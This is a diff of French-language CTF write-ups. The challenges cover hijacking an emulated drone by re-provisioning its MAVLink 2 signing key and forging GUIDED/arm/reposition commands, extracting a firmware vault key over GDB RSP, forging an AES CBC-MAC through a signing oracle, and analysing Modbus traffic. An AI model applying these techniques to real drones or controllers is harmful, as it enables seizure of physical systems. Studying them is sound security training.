-`method-note.txt` donne tout l'algorithme : `local_time` radar = UTC + décalage d'en-tête (`# radar_utc_offset_minutes=180`), appariement des échantillons UTC normalisés égaux, plan local autour du point du câble (`est=R·cos(lat0)·Δlon`, `nord=R·Δlat`, R=6378137), score par résidu médian, plus longue série ≥4 échantillons avec résidu ≥250 m et pas ≤15 m par composante pour la divergence, CPA de segment radar seul avec projection bornée. `/schema` liste les noms de membres et les tolérances (3 m, 2 s) mais **aucun exemple de corps**.
+`capture.tlog` contient 24 paquets MAVLink 2 signés (GCS 255/190 ↔ drone 1/1, link_id 249) : heartbeats, `STATUSTEXT` annonçant le serial `CX-FALCON-9951`, un `COMMAND_LONG 511`, des rapports `GLOBAL_POSITION_INT`. Chaque paquet porte une signature de 13 octets (link_id, timestamp 48 bits en ticks de 10 µs, SHA256-48), donc rejouer la capture est inutile : les timestamps sont vérifiés et la clé de session n'est pas dans la capture.
 
-**2. Hypothèse — une bijection complète à score quasi nul, et un menteur**
+`provisioning_note.md` est la voie d'entrée : les clés peuvent être re-provisionnées avec `SETUP_SIGNING`, authentifié par `prov_key = HKDF-SHA256(ikm = serial_ascii || commissioning_epoch_le64, salt = session_nonce, info = "CX-PROV/v1", L = 32)`. Le serial est connu ; le nonce est annoncé à la connexion (`PROV NONCE …`) ; ce qui manque est l'époque de commissioning — et tout timestamp que je signe doit correspondre à la RTC particulière du drone (ticks depuis l'époque de commissioning, *pas* l'époque MAVLink 2015, avec un offset et une dérive ppm par unité à calibrer).
 
-Avec le décalage soustrait, chaque piste R-01..R-16 correspond à un seul MMSI AIS avec un résidu médian de 0 m (les mauvaises paires sont ≥180 m : aucune ambiguïté). Les résidus par échantillon, plutôt que la médiane, révèlent le menteur : R-03 / MMSI `979103829` est à 466,7 m — exactement (330 m E, 330 m N) — à 10:26, 10:28, 10:30 et 10:32 UTC. Le CPA radar-seul sur tous les segments est R-03 elle-même, qui passe par le point du câble sur le segment 10:30→10:32 à u≈0,818.
+**2. Hypothèse — les deux horloges de la capture donnent l'époque et la dérive**
 
-**3. Exploitation — faire accepter le rapport**
+Chaque enregistrement tlog a un timestamp hôte (µs), et chaque paquet un timestamp de signature. En les appariant : les timestamps de signature croissent de 3 100 052–3 100 053 ticks par 31,000000 s de temps hôte, une pente constante de **100001,7 ticks/s = +17 ppm**. Avec cette pente, `signing_ticks = round((unix_time − E)·100001,7)` fitte les 24 paquets à un demi-tick près pour **E = 1733965123** (2024-12-12 00:58:43 UTC) et un offset supplémentaire nul. J'ai validé le modèle en live avant de l'utiliser : les timestamps de signature prédits encadraient ceux des propres signatures du drone à la connexion (avant/après l'aller-retour). Cela fixe à la fois l'entrée époque de HKDF et l'horloge de chaque paquet que je forge.
 
-`POST /reconcile` répondait `400 invalid report` à tout, sans indice (une erreur sémantique donnerait `422 report not accepted`). Le passage 400 → 422 sert d'oracle : j'ai balayé ~350 formes (associations en objets/chaînes/dictionnaire, intervalle en deux clés ou liste, vecteur en liste/objet, décalage en chaîne, enveloppes) jusqu'à obtenir un 422. La forme acceptée :
+Les messages d'erreur du drone ont ensuite cartographié le reste du protocole : un `SETUP_SIGNING` non signé → `REJECT: unsigned message` ; un message `SET_MODE` → `REJECT: not a command for this drone` (il ne prend que des `COMMAND_LONG`) ; armer avant GUIDED → `REJECT: must be in GUIDED before arming` ; la commande 512 → `REJECT: unexpected command 512`, tandis que **192 est son `DO_REPOSITION`** (`REJECT: DO_REPOSITION requires GUIDED + ARMED`). Donc l'ordre de vol de la note — GUIDED, armement, commande — est appliqué littéralement.
 
-```json
-{"version":"KALNET-RECON-1","radar_utc_offset_minutes":180,
- "associations":[{"radar_track":"R-01","mmsi":"<9 chiffres>"}, "... x16"],
- "divergence":{"mmsi":"<9 chiffres>","start_utc":"...Z","end_utc":"...Z",
-               "ais_minus_radar_east_m":330,"ais_minus_radar_north_m":330},
- "closest_approach":{"mmsi":"<9 chiffres>","utc":"...Z","distance_m":0.0}}
-```
+**3. Exploitation — re-provisionner, puis voler l'ordre normal, le tout sur une seule connexion**
 
-Le 422 restant venait de mon propre bug : j'avais converti l'heure du CPA avec `datetime.timestamp()` sur une date naïve, ce qui la décalait du fuseau local (09:31:38 au lieu de 10:31:38). Avec `calendar.timegm`, le serveur a renvoyé le flag.
+Le nonce est par connexion, donc tout se passe sur une seule connexion TCP, chaque paquet signé avec `SHA256-48(key ‖ packet ‖ link_id ‖ timestamp)` et un timestamp RTC frais et strictement croissant :
+
+1. Lire `PROV NONCE`, calculer `prov_key` par HKDF (salt = le nonce en octets bruts depuis l'hex).
+2. `SETUP_SIGNING` (msg 256) : une nouvelle clé de session de mon choix (le script utilise `SHA256("gridwatch-session-key-v1")`, n'importe quels 32 octets fonctionnent), `initial_timestamp` = son propre timestamp de signature, paquet signé avec `prov_key` → `signing re-provisioned: new key active`.
+3. Signés avec la nouvelle clé : `COMMAND_LONG 176` (`DO_SET_MODE`, param1=1, param2=4) → `mode GUIDED` ; `COMMAND_LONG 400` (armement, param1=1) → `ARMED` ; `COMMAND_LONG 192` (`DO_REPOSITION`, param5/6/7 = 45,6 / 24,1 / 100) → `COMMAND_ACK` plus un `STATUSTEXT` portant le flag.
 
 ```bash
-python3 solve/solve.py http://<cible>:<port> --post
+pip install pymavlink
+python3 solve/solve.py w02.ctf.chronos-security.ro 32773
 ```
 
 Script de résolution : `solve/solve.py` (voir l'annexe)
@@ -2594,23 +2530,24 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 `CSCTF{...}` (masqué)
 
-#### Réflexions
+#### Ce que j'ai appris
 
-- Quand une API ne donne aucun exemple, les codes de statut sont l'oracle : le passage 400 → 422 prouve que la *structure* est bonne avant que les *valeurs* soient vérifiées. Balayer les formes avec un pool de threads et n'afficher que les réponses non-400.
-- Ne pas se fier à une validation qui échoue à la fois sur la structure et les valeurs : après avoir trouvé la forme, un second bug (fuseau horaire) restait caché. Vérifier les valeurs dérivées contre les données (l'heure du CPA devait tomber dans le segment 10:30–10:32, pas 09:31).
-- Toujours utiliser des fonctions de temps explicites en UTC (`calendar.timegm`, `timezone.utc`) ; `timestamp()` sur une date naïve utilise silencieusement le fuseau de la machine.
+- La capture n'est pas là pour être rejouée mais pour être *mesurée* : deux timestamps par paquet suffisent à retrouver exactement l'époque et la dérive ppm de la RTC (résidus sous le demi-tick sur 24 paquets).
+- J'ai vérifié le modèle d'horloge contre le drone live avant d'envoyer quoi que ce soit de forgé — une mauvaise époque casse aussi l'entrée de HKDF, donc ce seul fit débloque à la fois la clé et les timestamps.
+- Les messages de rejet du serveur sont une spécification : chaque sonde refusée (`SET_MODE`, 512, armement trop tôt) a levé une inconnue, laissant 176 → 400 → 192 comme seul ordre accepté.
+- Tout doit partager une seule connexion car le salt de HKDF (le nonce) est annoncé par connexion.
 
-#### Outils & références
+#### Outils et références
 
-- Python 3 (`urllib`, `csv`, `statistics`, `concurrent.futures`), `curl`
-- Projection locale tangente, formule de CPA de segment tirée de `method-note.txt`
+- Python 3 + pymavlink (dialecte common, packing des messages / CRC extras), `hashlib`/`hmac` pour HKDF-SHA256 et les signatures SHA256-48
+- Signature de paquets MAVLink 2 et `SETUP_SIGNING` (message 256), commandes `COMMAND_LONG` 176 / 400 / 192
 
 
 ### Hard Landing
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| network | 120 | 86 | ✅ | — | 0xAr3s-root | Teodor Giurgica |
+| network | 86 | ✅ | — | non | 0xAr3s-root | Teodor Giurgica |
 
 #### Énoncé
 
@@ -2707,9 +2644,9 @@ La console valide la signature et la fenêtre de fraîcheur, exécute `RETURN_TO
 
 ### Radar Silence
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| network | 120 | 158 | ✅ | — | 0xAr3s-root | Chronos Security |
+| network | 158 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -2762,9 +2699,9 @@ Les labels utilisent l'alphabet `a-z2-7` → base32. On concatène par index 00�
 
 ### Severed Link
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| network | 120 | 84 | ✅ | — | 0xAr3s-root | Teodor Giurgica |
+| network | 84 | ✅ | — | non | 0xAr3s-root | Teodor Giurgica |
 
 #### Énoncé
 
@@ -2838,53 +2775,49 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Signature de paquets MAVLink 2 (`SETUP_SIGNING`, id de message 256) et trames (`COMMAND_INT`, `HEARTBEAT`)
 
 
-## Reverse / Malware
+### Water Hammer Reconciliation
 
-### Ghost Bank
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| reverse | 856 | 29 | ✅ | — | 0xAr3s-root | Chronos Security |
+| network | 124 | ✅ | — | non | 0xAr3s-root | Cosmin Gorea |
 
 #### Énoncé
 
-> A dormant relay bench from Brenzava exposes a single stopped GDB RSP endpoint. Behind it sits a controller with a sealed diagnostic bank. Recover the staged incident tasking; the flag is the code it contains.
+> The Vardessa Civil Water Reserve header was isolated after a hostile engineering-station interval, part of a wider campaign against emergency water logistics that coalition analysts tie to an Ash Army proxy. Vardessa is an Operation Dawn partner.
 >
-> Flag format: `CSCTF{...}`
+> Reconstruct the complete confirmed Modbus/TCP control history and submit the reconciliation identifier the evidence supports. `water-hammer-reconciliation.zip` holds all three evidence files: the capture `reserve-header.pcapng`, `station-profile.txt` and `capture-manifest.txt`. `station-profile.txt` defines the scoped conversation, the confirmation rule, the safety screen, the report grammar and the submission encoding; `capture-manifest.txt` identifies the evidence and its provenance. No live plant, external service or credential is involved.
+>
+> The capture holds ordinary reads, one exception and one unanswered write. A write acknowledgement on its own is not a confirmed control snapshot, so follow the profile's matched-readback rule.
+>
+> Flag format: `CSCTF{message}`
 
-**Fichiers fournis :** `files/ghost-bank.zip` → `firmware.bin` (image plate AArch64 de 956 o), `firmware-load.txt`, `capture.ndjson` (non commités). Instance live : RSP en TCP brut sur `w01.ctf.chronos-security.ro:34224` (expirée).
+**Fichiers fournis :** `files/reserve-header.pcapng`, `files/station-profile.txt`, `files/capture-manifest.txt` (non commités).
 
 #### En bref
 
-Le stub émule un contrôleur MMIO : `f(challenge)` du firmware le déverrouille, `CONTROL=0x9c` (STATUS 4) fait exposer par la page 7 la clé du coffre (32 o), et la page 3 (seule page avec `CIPHER_LEN≠0`, 131 o) se déchiffre avec le bloc ChaCha du firmware lui-même (nonce `SEAL-V01\0\0\0\1`, compteur 1) → tasking contenant le flag.
+Réassembler l'unique conversation Modbus/TCP, ne garder que les écritures FC16 dont l'écho normal unique est suivi du readback FC3 exact avec une réponse unique appariée (64 instantanés), les sérialiser dans le rapport canonique avec le masque d'insécurité en entiers, en SHA-256, puis encoder les 24 premiers octets en Base32 → flag.
 
 #### Démarche
 
-**1. Reconnaissance — un firmware jamais exécuté, une capture qui rejoue un rituel**
+**1. Reconnaissance — le profil est la spécification**
 
-`firmware-load.txt` donne la carte MMIO (CONTROL, PAGE, OFFSET, DATA, CIPHER_LEN, CHALLENGE, KEY, STATUS) et le sous-ensemble RSP. `c`/`s` renvoient juste `S05` : le firmware n'est jamais exécuté, le stub *émule* les registres. La capture montre le rituel `CONTROL=0x41 → lire CHALLENGE → PAGE=7 → KEY (2×32 bits) → CONTROL=0x93 → STATUS=3`. Dans radare2, la boucle vivante en `0x400040` fait exactement ça, avec la clé calculée par un `f()` de type splitmix en `0x400120` ; `f(0x0123456789abcdef)` égale la KEY capturée, ce qui valide le reverse. Reste du code mort : quart-de-ronde/bloc ChaCha (`0x400090`/`0x400174`), un stream-XOR (`0x4002dc`) et les constantes `"expand 32-byte k"` + `"SEAL-V01"`.
+`station-profile.txt` fixe tout : la conversation ciblée (`192.0.2.10:<éphémère>` → `192.0.2.20:502`, unit 17), la grammaire MBAP stricte (protocol id 0, Length = 1 + PDU, ni troncature ni octets en trop), la carte des registres (0x1000 consigne pompe, 0x1001 ouverture vanne en pour-mille, 0x1002 armé, 0x1003 rampe en µs), la règle de confirmation, un filtre de sécurité en entiers (E, V, Q avec `T_US = 37558`), le texte exact du rapport `R` et l'encodage (`SHA-256(R)` → 24 premiers octets → Base32 sans padding → 39 caractères), plus un vecteur de test synthétique public. `capture-manifest.txt` ne donne que la provenance et le SHA-256 de la capture, qui correspond (`6af88183…`).
 
-**2. Hypothèse — la banque est chiffrée en ChaCha, mais où est la clé ?**
+La capture est une seule conversation TCP (port client 36853) de 536 trames, 2 190 octets client et 1 933 octets serveur. Les frontières de segments n'ont pas d'importance : certains ADU sont coupés sur plusieurs segments, j'ai donc réassemblé chaque sens par numéro de séquence TCP et délimité les flux d'octets avec la longueur MBAP. Codes fonction côté client : 68 FC3 et 66 FC16 ; côté serveur : 68 FC3, 64 réponses FC16 normales et une exception FC16 (`0x90`, code 04).
 
-Les pages donnent des octets haute entropie, indépendants de la session, du challenge et de la clé. Beaucoup de temps perdu en devinettes (XOR répété, flux splitmix, ChaCha avec KEY/CHALLENGE/hashes XML comme clé, décompresseurs) — toutes négatives, car je ne lisais que les états 0/3 et seulement la page 7.
+**2. Hypothèse — un instantané demande quatre choses, dans l'ordre**
 
-Trois observations ont tout débloqué :
-- `qXfer` est annoncé dans `qSupported` mais répond `E01` sur une session fraîche ; après `CONTROL=0x41` il sert les XML (ils correspondent aux deux SHA-256 documentés et ne cachent rien — ce sont des contrôles d'intégrité, pas des clés).
-- `CIPHER_LEN` **dépend de la page** : balayer PAGE 0–63 ne le montre non nul que sur la **page 3 (131)**. Je ne l'avais lu que sur la page 7.
-- `CONTROL=0x9c` (dernier store du firmware) fait passer STATUS à **4**, et dans cet état la page 7 ne renvoie plus les octets scellés mais **32 octets de clé suivis de zéros**.
+Une écriture ne compte que si : (1) la requête FC16 est un candidat valide (unit 17, départ/quantité dans 0x1000–0x1003, Length `7 + 2N`, byte count `2N`) ; (2) exactement une réponse normale de même transaction id revient avec l'écho exact `10 || A || N` (l'exception, une requête sans réponse et tout écho dupliqué ou discordant ne confirment jamais) ; (3) l'ADU client immédiatement suivant cette réponse est exactement `FC3 1000 0004` (unit 17, Length 6) ; et (4) sa réponse est unique, de Length 11 avec `03 08` + 8 octets. Les valeurs des lignes sont les **registres du readback FC3**, pas les données écrites, et le `tid` du rapport est l'identifiant de transaction de la **réponse FC16** (ici `2000`, `2011`, `2022`… alors que les identifiants FC3 ressemblent à `8000`, `8013`…). Les instantanés sont ordonnés par l'ordinal de trame de la réponse FC16.
 
-**3. Exploitation**
+Leurres à écarter : les lectures FC3 initiales inoffensives (`e010`, `e011`), l'exception FC16 (`e100`), et la dernière requête FC16 sans réponse. Le résultat est exactement les 64 instantanés annoncés par le profil.
+
+**3. Exploitation — sérialiser et hacher**
+
+Avec le tuple initial (80, 500, 0, 60000) : `E = P·G/1000`, `V = E·10⁶/70686` (parties entières), `Q = 998·1065·|V − V_préc|`, `UNSAFE = A=1 ∧ R < 37558 ∧ Q > 9000·10⁵` ; le masque est `Σ UNSAFE_i · 2^(63−i)` sur 16 chiffres hexa majuscules. J'ai d'abord vérifié mes formules sur le vecteur de test public (V₋₁ = 565, ligne 0 : E=160, V=2263, Q=1804753260, masque `8000…`, SHA-256 `401df824…`, Base32 `IAO7QJHG…`) : tout correspond exactement. Sur les vraies données, les 64 lignes sont toutes armées, sous le seuil de rampe et avec un changement de vitesse (les contrôles de « l'intervalle d'attaque »), 22 dépassent la limite de Q, et le masque est `D3FC7C00A3060000`. Le rapport canonique est haché et les 24 premiers octets encodés en Base32 (39 caractères).
 
 ```bash
-python3 solve/solve.py w01.ctf.chronos-security.ro 34224   # depuis le dossier contenant firmware.bin
+python3 -I solve/solve.py files
 ```
-
-1. Lire la page 3 (131 o) — le chiffré.
-2. Faire le rituel avec `PAGE=7` (écrire une autre page avant la clé fait échouer le contrôle et remet PAGE à 0), `CONTROL=0x9c`, STATUS=4.
-3. Lire 32 octets de la page 7 → clé du coffre.
-4. Déchiffrer avec la fonction de bloc *du firmware* (Unicorn exécute `0x400174`, qui utilise une disposition d'état non standard ; un ChaCha20 de bibliothèque serait faux), bloc de flux `n` pour le compteur `1+n`, constantes `SEAL-V01` + `00 00 00 01`.
-
-Clair : `TASKING//STAGED-EW//RELAY-BENCH//AUTHKEY CSCTF{…}//JAM PROFILE: …//END`.
 
 Script de résolution : `solve/solve.py` (voir l'annexe)
 
@@ -2894,87 +2827,24 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 
 #### Réflexions
 
-- Je me suis fixé sur la page 7 car capture et firmware la mentionnent, et j'ai perdu du temps à cryptanalyser les mauvaises données. Énumérer *tous* les registres observables sur *toutes* les pages et dans *tous* les états avant d'attaquer le chiffre : `CIPHER_LEN` désignait la page 3 en une boucle.
-- Le code mort est la spec du device émulé : le dernier store du firmware (`0x9c`) était une transition d'état que j'avais écartée comme épilogue de boucle.
-- Les fonctions conditionnées à un état (`qXfer` après `0x41`) méritent d'être re-sondées après chaque transition.
-- Réutiliser la crypto du firmware par émulation plutôt que de la réimplémenter ; un « ChaCha » à état permuté ne matcherait jamais une bibliothèque.
+- Quand l'énoncé fournit une spécification et un vecteur de test, implémenter d'abord le vecteur : le retrouver à l'octet près (Base32 compris) élimine des classes entières de doutes d'erreur d'un cran et d'encodage avant de toucher aux vraies données.
+- Réassembler les flux TCP avant de parser : une lecture paquet par paquet couperait ou fusionnerait des ADU, et le profil dit explicitement que les frontières de segments ne créent aucun événement.
+- « Readback apparié » signifie que le rapport utilise la relecture de l'équipement, pas la commande ; et l'identifiant à sérialiser est le tid de la *réponse* FC16, un détail facile à rater.
+- Toute l'arithmétique est restée en entiers Python : Q atteint environ 2,4·10⁹, au-delà de l'entier signé 32 bits.
 
 #### Outils & références
 
-- Client RSP brut en Python 3, radare2 (`-a arm -b 64`), Unicorn (AArch64), gdb-multiarch inutile
-- GDB Remote Serial Protocol, ChaCha20 (structure RFC 8439), SplitMix64
+- `tshark` (vue d'ensemble des conversations), Python 3 (`struct`, `hashlib`, `base64` ; pcapng et réassemblage TCP maison)
+- Modbus Application Protocol v1.1b3 (FC3, FC16, exceptions), en-tête MBAP Modbus/TCP, RFC 4648 Base32
 
 
-### HELIOS-RTU
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| reverse | 782 | 52 | ✅ | — | 0xAr3s-root | Ionut Coserea |
-
-#### Énoncé
-
-> A HELIOS GRID remote terminal unit (RTU) exposes a single web service console. Behind it is a real emulated ATmega328P running signed control firmware. The unit issues a service token only for a correctly authenticated control directive — and the authentication key is physically unreadable from outside.
->
-> Identify the silicon, bring up the one interface on the bench that still answers, recover the application firmware, and produce a valid authentication tag over a control directive carrying the live nonce. Interact only with your assigned instance.
->
-> Flag format: `CSCTF{...}`
-
-**Fichiers fournis :** instance live uniquement (`http://w01.ctf.chronos-security.ro:34019/` au moment du solve — expirée)
-
-#### En bref
-
-Câbler l'adaptateur AVR ISP sur le header ICSP pour identifier un ATmega328P (`0x1e950f`) à la flash verrouillée, lire les 2 Kio d'application via le bootloader série USB, apprendre de sa trame de contrôle AES-CBC-MAC qu'une directive vaut `frame[16]=0xCC, frame[17]=0x0A, nonce en [18:26]`, et forger le tag avec l'oracle de chiffrement `svc sign` du service lui-même (`tag = sign(b2 XOR sign(b1))`).
-
-#### Démarche
-
-**1. Reconnaissance — un WebSocket, un banc, quatre adaptateurs**
-
-La page est un terminal muet : chaque ligne tapée part verbatim sur `/ws` en JSON, et le banc envoie sur le même socket une ligne `wire $ADAPTER $LEAD:$PIN ...`. `help` expose un vrai CLI `avrdude` (`signature, lfuse/hfuse/efuse/lock, flash, eeprom` lisibles) plus `bench`/`wire` ; `svc` n'existe qu'après le faux `apt install svc` (`nonce | telemetry | sign $REC | exec $FRAME $TAG`). Adaptateurs du banc : AVR ISP (6 fils), câble USB, sonde JTAG, sonde debugWIRE (DW/VCC/GND). Rien ne dit quel câblage est juste — les réponses console sont le seul oracle.
-
-**2. Hypothèse — identifier le silicium, puis essayer chaque transport**
-
-debugWIRE d'abord (`DW→RESET, VCC→5V, GND→GND_A`, `-c jtag2dw`) : `[debugwire] sending BREAK` mais la cible n'assert jamais la ligne dW. L'ISP sur le header ICSP (`MISO/MOSI/SCK/RESET/VCC/GND → ICSP_*`) répond immédiatement : signature `0x1e950f` (**ATmega328P**), `lfuse=FF hfuse=D8 efuse=FD lock=FC`. Les fusibles expliquent le banc : `DWEN=1` (debugWIRE fusible-off — d'où l'absence de sync), `SPIEN=0` (ISP vivant), `BOOTRST=0` avec section boot, et `LB` programmé donc lectures flash ISP en pur `0xFF` (EEPROM aussi). Le JTAG n'existe pas sur un 328P. Le câble USB (`-c arduino`) est l'interface qui répond encore avec de vraies données : le bootloader série renvoie les **2 Kio de firmware application** en flash `0x0000` (tout au-delà de `0x0800`, région de la clé incluse, lit `0xFF`).
-
-Désassemblage (radare2, AVR) de cette application : vecteurs → `main en 0x536` (trame UART `0xAA, type, len, payload`), un cœur AES-128 (`0x39a` chiffrement, `0x2b6` expansion de clé, S-box en flash `0x73`) dont les round keys s'expandent depuis 16 octets copiés de la flash `0x7F00` — précisément la région qu'aucune interface externe ne renverra. Les trames type-5 (payload 48 o) sont vérifiées par AES-CBC-MAC sur le payload, puis exigent `payload[16]==0xCC`, `payload[17]==0x0A`, puis répondent avec le nonce courant de 8 octets (PRNG xorshift32 en SRAM `0x1B0`, graine `0xE98EDACA`). Les commandes service sont la même machine à un niveau d'écart : `svc sign $REC16` est l'AES du dispositif comme oracle de chiffrement (enregistrements commençant `0xCC` refusés), `svc exec $FRAME32 $TAG` est le vérificateur type-5.
-
-**3. Exploitation — forgery CBC-MAC sur nonce live à usage unique**
-
-```bash
-python3 solve/solve.py http://w01.ctf.chronos-security.ro:34019/
-# [*] Live nonce    : ff0e23f621056868
-# [*] Frame         : 00000000000000000000000000000000cc0a$NONCE000000000000
-# [*] CBC-MAC tag   : c7fc… (sign[0] then sign[1 xor sign[0]])
-# [*] exec reply    : service: directive authenticated
-#                     service: control action ISSUE_TOKEN accepted
-#                     service: SERVICE TOKEN = CSCTF{...}
-```
-
-Layout de trame : 16 octets zéro, marqueur directive `CC 0A`, le nonce live (8 octets), 6 octets zéro. Tag : `sign(frame[0:16])`, XOR dans `frame[16:32]`, `sign` à nouveau — la construction CBC-MAC de manuel, calculée via l'oracle puisque la clé elle-même ne quitte jamais le chip (l'extraire n'a jamais été nécessaire). Le nonce est à usage unique et global à l'instance : le lire, faire les deux signs, et `exec` dans la même session, sinon l'unité répond `directive nonce stale`. Un mauvais offset de marqueur répond `frame carries no control directive` ; un mauvais tag répond `directive authentication failed` — les trois erreurs séparent proprement les trois contrôles.
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`flag{...}` (masqué)
-
-#### Ce que j'ai appris
-
-- Les octets fusibles sont une carte du banc : `DWEN`, `SPIEN`, `BOOTRST` et `LB` prédisaient lequel des quatre adaptateurs pouvait marcher avant qu'un seul fil soit tiré — lire `hfuse/lock` d'abord transforme « tout essayer » en checklist.
-- « Physiquement illisible » était littéral et borné : le bootloader renvoie volontiers l'application mais `0xFF`-ise le domicile de la clé en `0x7F00`. Le pivot voulu va d'*extraire la clé* à *utiliser le chiffrement du dispositif comme oracle* — la forgery CBC-MAC a besoin de l'oracle, pas de la clé.
-- Les messages d'erreur sont une spécification de protocole : `authentication failed` (MAC) contre `carries no control directive` (octets marqueurs) contre `nonce stale` (fraîcheur/position) m'ont dit laquelle des trois portes chaque tentative passait, transformant le layout de trame en recherche de 4 essais au lieu d'une devinette.
-
-#### Outils et références
-
-- Python 3 (client `websockets`, protocole ligne WebSocket `/ws`) + `curl` (recon des assets)
-- radare2 (`-a avr`, `aaa`/`pdf`) sur l'application récupérée via bootloader ; sémantique CLI `avrdude` en console
-- Datasheet ATmega328P (signature `0x1E950F`, cartes fusibles/lock-bits, conditions d'entrée debugWIRE/ISP/bootloader), forgery par oracle AES-128 CBC-MAC
-
+## Reverse / Malware
 
 ### Carrier Shadow
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| reverse | 540 | 264 | ✅ | — | 0xAr3s-root | Armand Alexandru Balint |
+| reverse | 264 | ✅ | — | non | 0xAr3s-root | Armand Alexandru Balint |
 
 #### Énoncé
 
@@ -3038,11 +2908,76 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Program headers ELF, table de recherche binaire `.eh_frame_hdr` (encodages DW_EH_PE), codes de Huffman canoniques, xorshift32, puff.c / DEFLATE brut
 
 
+### Ghost Bank
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| reverse | 29 | ✅ | — | non | 0xAr3s-root | Chronos Security |
+
+#### Énoncé
+
+> A dormant relay bench from Brenzava exposes a single stopped GDB RSP endpoint. Behind it sits a controller with a sealed diagnostic bank. Recover the staged incident tasking; the flag is the code it contains.
+>
+> Flag format: `CSCTF{...}`
+
+**Fichiers fournis :** `files/ghost-bank.zip` → `firmware.bin` (image plate AArch64 de 956 o), `firmware-load.txt`, `capture.ndjson` (non commités). Instance live : RSP en TCP brut sur `w01.ctf.chronos-security.ro:34224` (expirée).
+
+#### En bref
+
+Le stub émule un contrôleur MMIO : `f(challenge)` du firmware le déverrouille, `CONTROL=0x9c` (STATUS 4) fait exposer par la page 7 la clé du coffre (32 o), et la page 3 (seule page avec `CIPHER_LEN≠0`, 131 o) se déchiffre avec le bloc ChaCha du firmware lui-même (nonce `SEAL-V01\0\0\0\1`, compteur 1) → tasking contenant le flag.
+
+#### Démarche
+
+**1. Reconnaissance — un firmware jamais exécuté, une capture qui rejoue un rituel**
+
+`firmware-load.txt` donne la carte MMIO (CONTROL, PAGE, OFFSET, DATA, CIPHER_LEN, CHALLENGE, KEY, STATUS) et le sous-ensemble RSP. `c`/`s` renvoient juste `S05` : le firmware n'est jamais exécuté, le stub *émule* les registres. La capture montre le rituel `CONTROL=0x41 → lire CHALLENGE → PAGE=7 → KEY (2×32 bits) → CONTROL=0x93 → STATUS=3`. Dans radare2, la boucle vivante en `0x400040` fait exactement ça, avec la clé calculée par un `f()` de type splitmix en `0x400120` ; `f(0x0123456789abcdef)` égale la KEY capturée, ce qui valide le reverse. Reste du code mort : quart-de-ronde/bloc ChaCha (`0x400090`/`0x400174`), un stream-XOR (`0x4002dc`) et les constantes `"expand 32-byte k"` + `"SEAL-V01"`.
+
+**2. Hypothèse — la banque est chiffrée en ChaCha, mais où est la clé ?**
+
+Les pages donnent des octets haute entropie, indépendants de la session, du challenge et de la clé. Beaucoup de temps perdu en devinettes (XOR répété, flux splitmix, ChaCha avec KEY/CHALLENGE/hashes XML comme clé, décompresseurs) — toutes négatives, car je ne lisais que les états 0/3 et seulement la page 7.
+
+Trois observations ont tout débloqué :
+- `qXfer` est annoncé dans `qSupported` mais répond `E01` sur une session fraîche ; après `CONTROL=0x41` il sert les XML (ils correspondent aux deux SHA-256 documentés et ne cachent rien — ce sont des contrôles d'intégrité, pas des clés).
+- `CIPHER_LEN` **dépend de la page** : balayer PAGE 0–63 ne le montre non nul que sur la **page 3 (131)**. Je ne l'avais lu que sur la page 7.
+- `CONTROL=0x9c` (dernier store du firmware) fait passer STATUS à **4**, et dans cet état la page 7 ne renvoie plus les octets scellés mais **32 octets de clé suivis de zéros**.
+
+**3. Exploitation**
+
+```bash
+python3 solve/solve.py w01.ctf.chronos-security.ro 34224   # depuis le dossier contenant firmware.bin
+```
+
+1. Lire la page 3 (131 o) — le chiffré.
+2. Faire le rituel avec `PAGE=7` (écrire une autre page avant la clé fait échouer le contrôle et remet PAGE à 0), `CONTROL=0x9c`, STATUS=4.
+3. Lire 32 octets de la page 7 → clé du coffre.
+4. Déchiffrer avec la fonction de bloc *du firmware* (Unicorn exécute `0x400174`, qui utilise une disposition d'état non standard ; un ChaCha20 de bibliothèque serait faux), bloc de flux `n` pour le compteur `1+n`, constantes `SEAL-V01` + `00 00 00 01`.
+
+Clair : `TASKING//STAGED-EW//RELAY-BENCH//AUTHKEY CSCTF{…}//JAM PROFILE: …//END`.
+
+Script de résolution : `solve/solve.py` (voir l'annexe)
+
+#### Flag
+
+`CSCTF{...}` (masqué)
+
+#### Réflexions
+
+- Je me suis fixé sur la page 7 car capture et firmware la mentionnent, et j'ai perdu du temps à cryptanalyser les mauvaises données. Énumérer *tous* les registres observables sur *toutes* les pages et dans *tous* les états avant d'attaquer le chiffre : `CIPHER_LEN` désignait la page 3 en une boucle.
+- Le code mort est la spec du device émulé : le dernier store du firmware (`0x9c`) était une transition d'état que j'avais écartée comme épilogue de boucle.
+- Les fonctions conditionnées à un état (`qXfer` après `0x41`) méritent d'être re-sondées après chaque transition.
+- Réutiliser la crypto du firmware par émulation plutôt que de la réimplémenter ; un « ChaCha » à état permuté ne matcherait jamais une bibliothèque.
+
+#### Outils & références
+
+- Client RSP brut en Python 3, radare2 (`-a arm -b 64`), Unicorn (AArch64), gdb-multiarch inutile
